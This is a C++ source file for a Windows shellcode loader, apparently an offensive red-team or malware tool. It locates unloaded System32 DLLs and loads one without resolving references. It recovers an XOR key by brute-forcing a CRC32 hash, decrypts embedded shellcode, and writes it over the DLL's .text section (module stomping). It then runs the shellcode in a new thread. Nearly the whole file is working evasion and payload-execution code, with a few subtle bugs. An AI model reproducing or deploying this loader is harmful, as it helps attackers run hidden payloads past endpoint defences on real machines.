#include "Shellcode.h"

//
// Includes
//
#include <psapi.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <windows.h>
#include <winhttp.h>

//
// Debug Macros
//
#define DEBUG 1
#if DEBUG
#define PRINT_OK( x, ... )  printf( "[+] " x "\n", ##__VA_ARGS__ )
#define PRINT_ERR( x, ... ) printf( "[!] " x "\n", ##__VA_ARGS__ )
#define PRINT( x, ... )     printf( "[*] " x "\n", ##__VA_ARGS__ )
#define PRINT_DELIMITER()   printf( "----------------------------------------\n" )
#define NEWLINE()           printf( "\n" )
#else
#define PRINT_OK( x, ... )
#define PRINT_ERR( x, ... )
#define PRINT( x, ... )
#define PRINT_DELIMITER()
#define NEWLINE()
#endif

void ascii_to_hex( const char * ascii, unsigned char * hex, size_t hex_len ) {
    size_t ascii_len = strlen( ascii );
    for ( size_t i = 0; i < hex_len; i++ ) {
        if ( i * 2 + 1 < ascii_len && isxdigit( ascii[i * 2] ) && isxdigit( ascii[i * 2 + 1] ) ) {
            sscanf( &ascii[i * 2], "%2hhx", &hex[i] ); // Convert two characters at a time
        } else {
            hex[i] = 0;
        }
    }
}

constexpr unsigned int crc32h_impl( const char * message, unsigned int crc, unsigned int i ) {
    return ( message[i] == '\0' )
               ? ~crc
               : crc32h_impl(
                     message,
                     ( ( crc ^ message[i] ) >> 8 ) ^
                         ( ( ( crc ^ message[i] ) & 1 ? SEED : 0 ) ^
                           ( ( crc ^ message[i] ) & 2 ? ( SEED >> 1 ) : 0 ) ^
                           ( ( crc ^ message[i] ) & 4 ? ( SEED >> 2 ) : 0 ) ^
                           ( ( crc ^ message[i] ) & 8 ? ( SEED >> 3 ) : 0 ) ^
                           ( ( crc ^ message[i] ) & 16 ? ( SEED >> 4 ) : 0 ) ^
                           ( ( crc ^ message[i] ) & 32 ? ( SEED >> 5 ) : 0 ) ^
                           ( ( crc ^ message[i] ) & 64 ? ( ( SEED >> 6 ) ^ SEED ) : 0 ) ^
                           ( ( crc ^ message[i] ) & 128 ? ( ( ( SEED >> 6 ) ^ SEED ) >> 1 ) : 0 ) ),
                     i + 1
                 );
}

constexpr unsigned int crc32h( const char * message ) {
    return crc32h_impl( message, 0xFFFFFFFF, 0 );
}

unsigned char * Jesser( const char * known, size_t len, unsigned char * message, int depth, int currentDepth, unsigned int targetHash ) {
    if ( currentDepth == depth ) {
        message[len + currentDepth] = '\0';
        if ( crc32h( ( const char * )message ) == targetHash ) {
            unsigned char * result = ( unsigned char * )malloc( strlen( ( const char * )message ) + 1 );
            strcpy( ( char * )result, ( const char * )message );
            return result;
        }
        return NULL;
    }

    for ( char c = 33; c <= 126; ++c ) {
        message[len + currentDepth] = c;
        unsigned char * result      = Jesser( known, len, message, depth, currentDepth + 1, targetHash );
        if ( result != NULL ) {
            return result;
        }
    }

    return NULL;
}

unsigned char * Jess( const char * known, size_t len, int depth, unsigned int targetHash ) {
    //
    // if you decide to use a key larger than 64 bytes, plz expect this to break
    //
    unsigned char message[64];
    memset( message, 0, sizeof( message ) );
    memcpy( message, known, len );
    return Jesser( known, len, message, depth, 0, targetHash );
}

BOOL IsModuleLoaded(
    _In_ LPCSTR Module
) {
    HANDLE        Snapshot    = { 0 };
    MODULEENTRY32 ModuleEntry = { 0 };

    if ( ( Snapshot = CreateToolhelp32Snapshot( TH32CS_SNAPMODULE, GetCurrentProcessId() ) ) == INVALID_HANDLE_VALUE ) {
        PRINT_ERR( "CreateToolhelp32Snapshot failed" );
        return TRUE;
    }
    ModuleEntry.dwSize = sizeof( ModuleEntry );

    if ( ! Module32First( Snapshot, &ModuleEntry ) ) {
        PRINT_ERR( "Module32First failed" );
        return TRUE;
    }

    do {
        if ( strcmp( ModuleEntry.szModule, Module ) == 0 ) {
            PRINT_ERR( "%s is already loaded", Module );
            return TRUE;
        }
    } while ( Module32Next( Snapshot, &ModuleEntry ) );

    return FALSE;
}

LPVOID ModuleAlloc(
    _In_ const LPCSTR * ModuleName,
    _In_ SIZE_T         ModuleCount,
    _In_ DWORD          Size
) {
    LPVOID                Base         = { 0 };
    PIMAGE_DOS_HEADER     MmDosHdr     = { 0 };
    PIMAGE_NT_HEADERS     MmNtHdr      = { 0 };
    PIMAGE_SECTION_HEADER MmSectionHdr = { 0 };
    DWORD                 TxtSize      = { 0 };
    PVOID                 TxtAddr      = { 0 };

    for ( SIZE_T i = 0; i < ModuleCount; i++ ) {

        if ( IsModuleLoaded( ModuleName[i] ) ) {
            continue;
        }

        if ( ! ( Base = LoadLibraryExA( ModuleName[i], NULL, DONT_RESOLVE_DLL_REFERENCES ) ) ) {
            PRINT_ERR( "failed to load %s", ModuleName[i] );
            continue;
        }

        PRINT_OK( "%s => %p", ModuleName[i], Base );

        MmDosHdr = ( PIMAGE_DOS_HEADER )Base;
        MmNtHdr  = ( PIMAGE_NT_HEADERS )( ( UINT_PTR )Base + MmDosHdr->e_lfanew );
        PRINT_OK( "[%s] DOS: %p, NT: %p", ModuleName[i], MmDosHdr, MmNtHdr );

        MmSectionHdr = IMAGE_FIRST_SECTION( MmNtHdr );
        for ( DWORD i = 0; i < MmNtHdr->FileHeader.NumberOfSections; i++ ) {
            if ( strcmp( ( CHAR * )MmSectionHdr->Name, ".text" ) == 0 ) {
                break;
            }
        }

        TxtSize = MmSectionHdr->Misc.VirtualSize;
        if ( TxtSize < Size ) {
            /**
             * abort and move on to the next module
             */
            if ( Base ) {
                FreeLibrary( HMODULE( Base ) );
            }
            continue;
        }

        TxtAddr = ( PVOID )( ( UINT_PTR )Base + MmSectionHdr->VirtualAddress );
        break;
    }

    if ( ! TxtAddr ) {
        PRINT_ERR( "no suitable module found" );
        return NULL;
    }

    return TxtAddr;
}

BOOL FindModules(
    _Inout_ LPCSTR * Modules,
    _In_ SIZE_T      Max,
    _Out_ SIZE_T *   Count
) {
    *Count                = 0;
    const char *     Path = "C:\\Windows\\System32";
    WIN32_FIND_DATAA findData;
    HANDLE           hFind = INVALID_HANDLE_VALUE;
    char             searchPattern[MAX_PATH];
    snprintf( searchPattern, MAX_PATH, "%s\\*.dll", Path );
    hFind = FindFirstFileA( searchPattern, &findData );
    if ( hFind == INVALID_HANDLE_VALUE ) {
        return FALSE;
    }
    do {
        if ( *Count >= Max ) {
            break;
        }

        char dllPath[MAX_PATH];
        snprintf( dllPath, MAX_PATH, "%s\\%s", Path, findData.cFileName );

        //
        // if we can't get a handle to the module, it's probably not loaded
        //
        HMODULE hModule = GetModuleHandleA( findData.cFileName );
        if ( hModule == NULL ) {
            if ( strlen( findData.cFileName ) > 10 ) {
                continue;
            }
            Modules[*Count] = _strdup( findData.cFileName );
            if ( Modules[*Count] == NULL ) {
                FindClose( hFind );
                return FALSE;
            }
            ( *Count )++;
        }

    } while ( FindNextFileA( hFind, &findData ) != 0 );
    FindClose( hFind );
    return TRUE;
};

BOOL XOR(
    _In_ PUCHAR Data,
    _In_ SIZE_T DataSize,
    _In_ PUCHAR Key,
    _In_ SIZE_T KeySize
) {
    PRINT( "Xoring with key: %s", Key );
    PRINT( "DataSize: %d, KeySize: %d", DataSize, KeySize );
    for ( SIZE_T i = 0; i < DataSize; i++ ) {
        BYTE temp = Key[i % KeySize];
        Data[i] ^= temp;
        temp ^= 0x41;
        temp ^= 0x41;

        Data[i] ^= ( temp ^ temp );
    }
    return TRUE;
}

INT main( int argc, char ** argv ) {
    CONST SIZE_T Max          = 100;
    SIZE_T       Count        = 0;
    LPCSTR       Modules[Max] = { 0 };
    if ( ! FindModules( Modules, Max, &Count ) ) {
        PRINT_ERR( "FindModules failed" );
        return 1;
    }

    LPVOID TxtAddr = ModuleAlloc( Modules, Max, SHELLCODE_SIZE );

    if ( ! TxtAddr ) {
        PRINT_ERR( "ModuleAlloc failed" );
        return 1;
    }

    //
    // derive key
    //
    // EXT const unsigned int targetHash = 0xdeadbeef;
    // EXT const char known[] = { 0x41, 0x41, 0x41, 0x41 };
    //
    const size_t    key_size      = 8; // adjust as needed (note ascii vs binary)
    const size_t    size_to_brute = 4;
    unsigned char   key[key_size] = { 0 };
    unsigned char * ascii_key     = { 0 };

    if ( ( ascii_key = Jess( known, sizeof( known ), size_to_brute, targetHash ) ) == NULL ) {
        PRINT_ERR( "Jess failed" );
        return 1;
    }

    ascii_to_hex( ( const char * )ascii_key, key, key_size );
    free( ascii_key );

    BOOL   WriteSuccess = { 0 };
    HANDLE Thread       = { 0 };

    if ( ! XOR( Shellcode, SHELLCODE_SIZE, key, sizeof( key ) ) ) {
        PRINT_ERR( "XOR failed" );
        return 1;
    }

    if ( ! ( WriteSuccess = WriteProcessMemory( GetCurrentProcess(), TxtAddr, Shellcode, SHELLCODE_SIZE, NULL ) ) ) {
        PRINT_ERR( "WriteProcessMemory failed, %d", GetLastError() );
        return 1;
    }

    if ( ! ( Thread = CreateThread( NULL, 0, LPTHREAD_START_ROUTINE( TxtAddr ), NULL, 0, NULL ) ) ) {
        PRINT_ERR( "CreateThread failed, %d", GetLastError() );
        return 1;
    }

    WaitForSingleObject( Thread, INFINITE );
    return 0;
}